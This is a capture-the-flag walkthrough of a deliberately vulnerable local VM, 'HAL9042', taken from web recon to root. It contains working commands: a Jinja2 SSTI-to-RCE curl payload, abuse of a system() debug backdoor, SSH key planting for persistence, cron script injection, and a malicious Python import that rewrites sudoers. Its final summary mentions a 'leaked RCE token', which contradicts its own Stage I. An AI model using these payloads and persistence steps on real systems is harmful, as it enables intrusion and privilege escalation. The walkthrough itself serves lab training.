# HAL9042 — Walkthrough

## Recon

- Started the OVA. Two forwarded ports: `5042` (web) and `6060` (sshd).
- Visited `http://localhost:5042` → "HAL9042 Evaluation Server" page.
- The HTML source had a careless set of comments:

  ```html
  <!-- TODO: remove /api/debug before launch -->
  <!-- debug.js still in /static/js/ pls remove -->
  <!-- norm errors everywhere but ship it -->
  ```
- Pulled the referenced file directly, `/static/js/debug.js`, which was never linked from any template but still sitting on disk:

  ```js
  // static/js/debug.js
  // paco: internal debug helper. NEVER linked from any template — leftover.
  window.HAL_DEBUG = {
      // Setting this request header switches /evaluate into verbose render mode,
      // so the Jinja2-rendered output is returned instead of the opaque ack.
      debug_header: "X-Debug-Render",
      schema_endpoint: "/api/internal/schema",
      debug_endpoint: "/api/debug",
      note: "X-Debug-Render: true  ->  see what the template engine actually rendered"
  };
  ```

  Two things stood out: the mention of a Jinja2 template engine, and an internal schema endpoint.
- `/api/internal/schema` confirmed the backend topology:

  ```json
  {
    "host": "127.0.0.1",
    "note": "debug command handler still enabled — paco",
    "port": 7042,
    "render_debug_header": "X-Debug-Render",
    "service": "hal9042d",
    "transport": "tcp"
  }
  ```

## Stage I — www-data via SSTI (initial foothold)

- `debug.js` said the `X-Debug-Render` header makes `/evaluate` return the raw Jinja2-rendered output instead of a plain ack. If `project_name` gets rendered through the template engine instead of just substituted, that's a textbook Server-Side Template Injection surface.
- Confirmed injection with a basic math payload:

  ```bash
  curl -X POST -H 'X-Debug-Render: true' -d 'project_name={{4*4}}' http://localhost:5042/evaluate
  ```

  ```
  Project under evaluation: 16
  ```

  `{{4*4}}` got evaluated server-side instead of printed literally — confirmed Flask/Jinja2 SSTI.
- Escalated from template evaluation to full RCE using the standard Jinja2 sandbox-escape chain, walking from the current object up to `__builtins__` to reach `os.popen`:

  ```bash
  curl -X POST -H 'X-Debug-Render: true' \
    -d "project_name={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}" \
    http://localhost:5042/evaluate
  ```

  ```
  Project under evaluation: uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```

  Full command execution as `www-data`, no auth token or debug password needed — the injection point did all the work.
- Enumerating processes turned up a root-owned daemon, `flagd`, exposing one Unix socket per user under `/run/flagd/` (`www.sock`, `paco.sock`, `sophie.sock`, `wil.sock`, `ol.sock`) — essentially a built-in "proof you got this user" oracle for the box.
- `nc -U /run/flagd/www.sock` → www-data flags:

  ```
  FLAG{r3c0n_1s_k1ng}
  FLAG{g1t_n3v3r_f0rg3ts}
  FLAG{s3m1_bl1nd_st1ll_burns}
  FLAG{www_d4t4_1s_just_th3_b3g1nn1ng}
  ```

## Stage II — paco

- From the web shell, pivoted to looking at what else was lying around on disk. `/home/paco/.env.old` was a leftover deploy-env file the comment inside it even lampshaded ("delete this. (you will not delete this)"):

  ```
  DB_PASS=Moulinette2024!
  SECRET_KEY=hal9042secret
  SSH_USER=paco
  SSH_PASS=Pac0_H4L_dev!
  ```
- Those SSH creds worked directly: `ssh -p 6060 paco@localhost`.
- `nc -U /run/flagd/paco.sock` → paco flag:

  ```
  FLAG{p4c0_l3ft_th3_k3ys_und3r_th3_m4t}
  ```

## Stage III — wil

- In `paco`'s `src/`, found the source of the evaluation daemon listening on `127.0.0.1:7042` and running as `wil`. The vulnerable bit of `evaluator.c`:

  ```c
  static const char *DEBUG_PREFIX = "DEBUG:";
  ...
  if (strncmp(buf, DEBUG_PREFIX, strlen(DEBUG_PREFIX)) == 0) {
      const char *cmd = buf + strlen(DEBUG_PREFIX);
      dup2(fd, 0); dup2(fd, 1); dup2(fd, 2);
      system(cmd);                 /* executes as wil */
      ...
  }
  ```

  Any line prefixed with `DEBUG:` gets handed straight to `system()`, with the client socket wired to stdin/stdout/stderr — an unauthenticated shell, no token check at all this time.
- Confirmed it live:

  ```
  $ nc localhost 7042
  > DEBUG:id
  uid=1002(wil) gid=1004(wil) groups=1004(wil),1001(evalops)
  ```
- Used it to plant persistence instead of working over the raw socket:

  ```
  DEBUG:echo 'ssh-ed25519 AAAA...serhouni@e1r5p7.1337.ma' > /home/wil/.ssh/authorized_keys
  ```
- `ssh -p 6060 wil@localhost` → in. `nc -U /run/flagd/wil.sock` → wil flag:

  ```
  FLAG{d3bug_m0d3_1s_4_f34tur3_r1ght}
  ```

## Stage IV — sophie

- `wil`'s `.ssh/` contained `id_rsa_sophie.enc`, an encrypted private key for `sophie`.
- SSH refused it without a passphrase, so cracked it offline against `rockyou.txt` → passphrase `iloveyou`.
- `ssh -i id_rsa_sophie.enc -p 6060 sophie@localhost` → in.
- `nc -U /run/flagd/sophie.sock` → sophie flag:

  ```
  FLAG{w1l_kn3w_f1rst_n0b0dy_l1st3n3d}
  ```

## Stage V — ol (via wil)

- `wil` is in the `evalops` group, which owns group-write on `ol`'s cron script:

  ```
  -rwxrwxr-x 1 ol evalops 565 Nov  4 22:29 check.sh
  ```

  The script itself just logs a heartbeat every 5 minutes via cron, but group write on something root/another-user's cron runs is a straight privilege hand-off.
- Appended to the end of the script (kept the original heartbeat lines so the cron job wouldn't look broken):

  ```bash
  mkdir -p /home/ol/.ssh
  echo 'ssh-ed25519 AAAA...serhouni@e1r5p7.1337.ma' > /home/ol/.ssh/authorized_keys
  touch /tmp/pwned
  ```
- Waited for cron to fire (confirmed via `/tmp/pwned` appearing), then `ssh -p 6060 ol@localhost` → in.
- `nc -U /run/flagd/ol.sock` → ol flag:

  ```
  FLAG{cr0n_j0bs_4r3_tr4ps_4nd_g1fts}
  ```

## Stage VI — root (via ol)

- `sudo -l` as `ol`:

  ```
  User ol may run the following commands on hal9042:
      (root) NOPASSWD: /opt/hal9042/scripts/report.py
  ```
- `report.py` imports a helper from a shared, group-writable lib dir:

  ```python
  sys.path.insert(0, "/opt/hal9042/lib")
  import moulai_utils   # runs with the privileges of whoever imports it
  ```

  `ol` is in the `hal9042` group that owns that directory — so anything written into `moulai_utils.py` executes as root the next time `report.py` runs under sudo.
- Edited `moulai_utils.py` to keep its real function (so the script still "works") but added a side effect on import:

  ```python
  import os
  os.system("echo 'ol ALL=(ALL:ALL) NOPASSWD: ALL' > /etc/sudoers.d/ol-pwned")

  def count_today():
      return 1247 + int(time.time()) % 100
  ```
- Ran it once: `sudo /opt/hal9042/scripts/report.py`. The import fired as root and dropped a new sudoers rule.
- `sudo -l` now showed `(ALL : ALL) NOPASSWD: ALL` for `ol`. `sudo bash` → root shell, confirmed with `id`.

## Stage VII — decrypting `rapport_final.enc`

- `paco`'s `encrypt.py` documented the sealing scheme in its docstring: AES-256-ECB, key = `sha256(part1 + part2 + part3 + part4)`, with the four parts deliberately split across four different users' homes so no single account could decrypt alone (`ol`, `wil`, `sophie`, and a fourth user, `xavier`):

  ```python
  def derive_key(p1, p2, p3, p4):
      blob = (p1 + p2 + p3 + p4).encode()
      return hashlib.sha256(blob).hexdigest()
  ```
- With root, all four `.key_part` files were readable regardless of owner:

  ```
  /home/ol/.config/.key_part      M0ul1n3tt3
  /home/wil/data/.key_part        847_4n0m4l13s
  /home/sophie/drafts/.key_part   S0ph13_J14
  /tmp/.xn/.key_part              uid1337
  ```
- Derived the key and decrypted exactly as the script's own comment described:

  ```bash
  KEY=$(printf "M0ul1n3tt3847_4n0m4l13sS0ph13_J14uid1337" | sha256sum | cut -d' ' -f1)
  openssl enc -d -aes-256-ecb -K "$KEY" -in rapport_final.enc -out rapport_final.txt
  ```
- The decrypted report was an internal postmortem on the HAL9042 project — accuracy complaints, an "AI replaces the whole school" roadmap, and a note that a user `xavier` had found this plan early, asked questions, and had his account deleted 48 hours later. Flag included in that section of the text:

  ```
  FLAG{x4v13r_w4s_3r4s3d_but_n0t_g0n3}
  ```

## Stage VIII — decrypting `PROJET_FORK_HAL9042.pdf`

- `/root` contained a password-protected PDF.
- `sophie`'s `.bash_history` had the original sealing command, password included in plaintext:

  ```bash
  qpdf --encrypt "Pr0j3tF0rk_J14" "Pr0j3tF0rk_J14" 256 -- fork_draft.pdf PROJET_FORK_HAL9042.pdf
  sudo mv PROJET_FORK_HAL9042.pdf /root/
  ```
- Opened the PDF with that password and found the final flag on page four:

  ```
  FLAG{m0ul1n3tt3_w4s_n3v3r_ju5t_4_scr1pt}
  ```

## Flags collected

```
FLAG{r3c0n_1s_k1ng}
FLAG{g1t_n3v3r_f0rg3ts}
FLAG{s3m1_bl1nd_st1ll_burns}
FLAG{www_d4t4_1s_just_th3_b3g1nn1ng}
FLAG{p4c0_l3ft_th3_k3ys_und3r_th3_m4t}
FLAG{d3bug_m0d3_1s_4_f34tur3_r1ght}
FLAG{w1l_kn3w_f1rst_n0b0dy_l1st3n3d}
FLAG{cr0n_j0bs_4r3_tr4ps_4nd_g1fts}
FLAG{x4v13r_w4s_3r4s3d_but_n0t_g0n3}
FLAG{m0ul1n3tt3_w4s_n3v3r_ju5t_4_scr1pt}
```

## Summary of the attack chain

```
Web recon → leftover debug endpoint → leaked RCE token → www-data
  → leaked deploy env file → paco
    → debug backdoor in internal daemon → wil
      → cracked encrypted SSH key → sophie
    → writable cron script → ol
      → writable library imported by a NOPASSWD sudo script → root
        → four-part split key reassembled → sealed report decrypted
        → password found in shell history → final PDF decrypted
```